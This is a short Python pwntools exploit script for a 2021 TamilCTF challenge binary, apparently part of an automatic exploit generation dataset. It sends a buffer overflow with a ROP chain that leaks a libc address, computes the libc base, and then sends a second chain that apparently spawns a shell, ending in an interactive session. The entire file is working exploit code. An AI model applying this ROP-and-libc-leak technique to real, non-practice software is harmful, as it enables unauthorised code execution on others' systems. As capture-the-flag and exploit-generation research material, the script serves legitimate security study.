from pwn import p64, u64, p32, u32
import pwn
import sys
        
pwn.context.log_level = "debug"
pwn.context.timeout = 20
p = pwn.process("/home/yuge/Documents/ACBEG/binaries/bofaeg_challenges/20_tamilctf2021_name/tamilctf2021_name")
pwn.gdb.attach(p)
p.recvuntil(b'Welcome to TamilCTF\nwhat is you name: ')
payload = b"\x00" * 40
payload += p64(0x4004c6) + p64(0x4006d3) + p64(0x600ff0) + p64(0x4004e0) + p64(0x4006ca) + p64(0x0) + p64(0x1) + p64(0x601030) + p64(0x0) + p64(0x601880) + p64(0x18) + p64(0x4006b0) + b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' + p64(0x400588) + p64(0x601878) + p64(0x400660)
payload = payload.ljust(500, b"a")
p.send(payload)
libc_base = u64(p.recv()[0:6].ljust(8,b'\x00')) + -0x21ba0
pwn.log.success('libc_base:' + hex(libc_base))
payload = b""
payload += p64(0x4006d3) + p64(libc_base + 0x1b3d88) + p64(libc_base + 0x4f420)
p.send(payload)
p.interactive()
